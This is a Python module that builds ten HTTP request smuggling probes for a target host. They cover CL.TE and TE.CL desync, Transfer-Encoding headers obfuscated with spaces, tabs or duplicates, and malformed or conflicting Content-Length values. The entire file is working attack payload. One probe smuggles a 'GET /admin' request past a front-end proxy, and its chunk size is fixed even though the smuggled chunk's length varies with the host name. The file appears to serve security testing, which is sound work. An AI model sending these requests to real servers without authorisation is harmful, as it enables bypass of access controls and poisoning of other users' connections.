"""Request smuggling probes — CL/TE matrix."""
from typing import List

# The exact bytes we send. All requests are POST to / with no body
# beyond what the framing headers declare.
def build_smuggle_probes(host: str, port: int = 443) -> List[dict]:
    probes = []

    # 1. CL.TE — CL honored by front, TE honored by back
    body_1 = b"0\r\n\r\nG"
    req_1 = (
        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Length: {len(body_1)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body_1
    probes.append({"label": "cl_te", "bytes": req_1,
                   "desc": "CL honored first, TE second"})

    # 2. TE.CL — TE honored by front, CL by back
    body_2 = (
        b"5c\r\n"
        b"GET /admin HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n"
        b"0\r\n\r\n"
    )
    req_2 = (
        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body_2
    probes.append({"label": "te_cl", "bytes": req_2,
                   "desc": "TE honored first, CL second"})

    # 3. TE obfuscated — space before colon
    req_3 = (
        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        f"Transfer-Encoding : chunked\r\n"
        f"Connection: close\r\n\r\n0\r\n\r\n"
    ).encode()
    probes.append({"label": "te_space", "bytes": req_3,
                   "desc": "TE with space before colon"})

    # 4. Duplicate TE
    req_4 = (
        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Transfer-Encoding: identity\r\n"
        f"Connection: close\r\n\r\n0\r\n\r\n"
    ).encode()
    probes.append({"label": "te_dup", "bytes": req_4,
                   "desc": "Duplicate TE headers"})

    # 5. TE with tab
    req_5 = (
        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        f"Transfer-Encoding:\tchunked\r\n"
        f"Connection: close\r\n\r\n0\r\n\r\n"
    ).encode()
    probes.append({"label": "te_tab", "bytes": req_5,
                   "desc": "TE with tab separator"})

    # 6. TE with vertical tab
    req_6 = (
        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        f"Transfer-Encoding:\x0bchunked\r\n"
        f"Connection: close\r\n\r\n0\r\n\r\n"
    ).encode()
    probes.append({"label": "te_vtab", "bytes": req_6,
                   "desc": "TE with vertical tab"})

    # 7. CL with plus
    body_7 = b"G"
    req_7 = (
        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Length: +{len(body_7)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body_7
    probes.append({"label": "cl_plus", "bytes": req_7,
                   "desc": "CL with leading plus"})

    # 8. CL with leading zero
    body_8 = b"G"
    req_8 = (
        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Length: 0{len(body_8)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body_8
    probes.append({"label": "cl_zero", "bytes": req_8,
                   "desc": "CL with leading zero"})

    # 9. Both CL values different
    body_9 = b"GGGGGGGGGG"
    req_9 = (
        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Length: 5\r\n"
        f"Content-Length: {len(body_9)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body_9
    probes.append({"label": "cl_dup", "bytes": req_9,
                   "desc": "Two different CL values"})

    # 10. TE + CL together with different values
    body_10 = b"0\r\n\r\nG"
    req_10 = (
        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Length: 100\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body_10
    probes.append({"label": "cl_te_big", "bytes": req_10,
                   "desc": "CL much larger than real body"})

    return probes
